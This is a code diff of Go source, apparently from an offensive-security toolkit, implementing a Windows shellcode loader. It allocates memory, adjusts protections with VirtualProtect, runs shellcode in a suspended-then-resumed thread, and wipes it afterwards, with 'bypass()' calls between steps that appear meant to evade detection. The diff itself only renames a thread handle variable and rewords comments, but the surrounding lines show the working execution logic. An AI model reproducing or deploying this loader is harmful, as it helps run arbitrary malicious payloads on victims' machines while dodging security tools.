@@ -15,9 +15,9 @@ import (
 
 const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
 
-// Execute is used to execute shellcode, default method is VirtualProtect,.
-// It will block until shellcode return.
-// warning: shellcode slice will be covered.
+// Execute is used to execute shellcode, default method is VirtualProtect.
+// It will block until thread is exit.
+// [Warning]: shellcode slice will be covered.
 func Execute(method string, shellcode []byte) error {
 	defer security.CoverBytes(shellcode)
 	switch method {
@@ -31,7 +31,7 @@ func Execute(method string, shellcode []byte) error {
 }
 
 // VirtualProtect is used to use virtual protect to execute shellcode,
-// it will block until shellcode exit, if the shellcode will cover it self.
+// it will block until shellcode exit, if the shellcode will cover it self,
 // use CreateThread to replace it.
 func VirtualProtect(shellcode []byte) error {
 	l := len(shellcode)
@@ -46,14 +46,14 @@ func VirtualProtect(shellcode []byte) error {
 	}
 	// create thread first and suspend
 	bypass()
-	tHandle, _, err := api.CreateThread(nil, 0, memAddr, nil, windows.CREATE_SUSPENDED)
+	hThread, _, err := api.CreateThread(nil, 0, memAddr, nil, windows.CREATE_SUSPENDED)
 	if err != nil {
 		return err
 	}
 	var threadHandleClosed bool
 	defer func() {
 		if !threadHandleClosed {
-			api.CloseHandle(tHandle)
+			api.CloseHandle(hThread)
 		}
 	}()
 	// set read write and copy shellcode
@@ -72,18 +72,18 @@ func VirtualProtect(shellcode []byte) error {
 	}
 	// resume thread for execute shellcode
 	bypass()
-	_, err = windows.ResumeThread(tHandle)
+	_, err = windows.ResumeThread(hThread)
 	if err != nil {
 		return errors.Wrap(err, "failed to resume thread")
 	}
 	// wait execute finish
 	bypass()
-	_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
+	_, err = windows.WaitForSingleObject(hThread, windows.INFINITE)
 	if err != nil {
 		return errors.Wrap(err, "failed to wait thread")
 	}
 	// close thread handle at once
-	api.CloseHandle(tHandle)
+	api.CloseHandle(hThread)
 	threadHandleClosed = true
 	// set read write for clean shellcode
 	bypass()
@@ -111,38 +111,37 @@ func CreateThread(shellcode []byte) error {
 	}
 	// create thread first and suspend
 	bypass()
-	tHandle, _, err := api.CreateThread(nil, 0, memAddr, nil, windows.CREATE_SUSPENDED)
+	hThread, _, err := api.CreateThread(nil, 0, memAddr, nil, windows.CREATE_SUSPENDED)
 	if err != nil {
 		return err
 	}
 	var threadHandleClosed bool
 	defer func() {
 		if !threadHandleClosed {
-			api.CloseHandle(tHandle)
+			api.CloseHandle(hThread)
 		}
 	}()
 	copyShellcode(memAddr, shellcode)
 	// resume thread for execute shellcode
 	bypass()
-	_, err = windows.ResumeThread(tHandle)
+	_, err = windows.ResumeThread(hThread)
 	if err != nil {
 		return errors.Wrap(err, "failed to resume thread")
 	}
 	// wait execute finish
 	bypass()
-	_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
+	_, err = windows.WaitForSingleObject(hThread, windows.INFINITE)
 	if err != nil {
 		return errors.Wrap(err, "failed to wait thread")
 	}
 	// close thread handle at once
-	api.CloseHandle(tHandle)
+	api.CloseHandle(hThread)
 	threadHandleClosed = true
 	return cleanShellcode(memAddr, size)
 }
 
-// copyShellcode is used to copy shellcode to memory.
-// It will not call bypass when copy large shellcode
-// for prevent block when copy large shellcode.
+// copyShellcode is used to copy shellcode to memory. It will not
+// call bypass when copy large shellcode for prevent block.
 func copyShellcode(memAddr uintptr, shellcode []byte) {
 	bypass()
 	rand := random.NewRand()
